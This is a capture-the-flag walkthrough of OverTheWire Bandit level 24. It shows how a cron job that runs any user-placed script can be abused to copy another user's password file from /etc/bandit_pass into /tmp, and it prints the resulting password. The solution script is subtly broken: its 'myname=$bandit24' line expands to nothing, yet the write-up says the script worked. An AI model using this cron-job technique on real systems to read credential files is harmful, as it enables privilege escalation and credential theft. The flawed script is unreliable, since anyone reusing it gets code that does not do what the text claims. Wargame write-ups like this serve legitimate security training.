## Bandit Level 24

## Level goal
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
**NOTE:** This level requires you to create your own first shell-script.

## Solution
    - **cd /etc/cron.d**
    - **cat cronjob_bandit24** => bandit24 /usr/bin/cronjob_bandit24.sh
    - cd /usr/bin => cat cronjob_bandit24.sh

    ```
     #!/bin/bash
    myname=$(whoami)
    cd /var/spool/$myname/foo
    echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
    for i in * .*;
    do
        if [ "$i" != "." -a "$i" != ".." ];
        then
            echo "Handling $i"
            owner="$(stat --format "%U" ./$i)"
            if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
            fi
            rm -f ./$i
        fi
    done
    ```

    - go to the specified file, create the script and run it to obtain the next password
    - **cd /var/spool/$myname/foo
    - nano firstScrip.sh

     ```
      #!/bin/bash
    myname=$bandit24
    mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
    echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
    cat /etc/bandit_pass/$myname > /tmp/$mytarget
    ```

    - we obtain the path /tmp/ee4ee1703b083edac9f8183e4ae70293
    - cat /tmp/ee4ee1703b083edac9f8183e4ae70293

## Password
    - gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
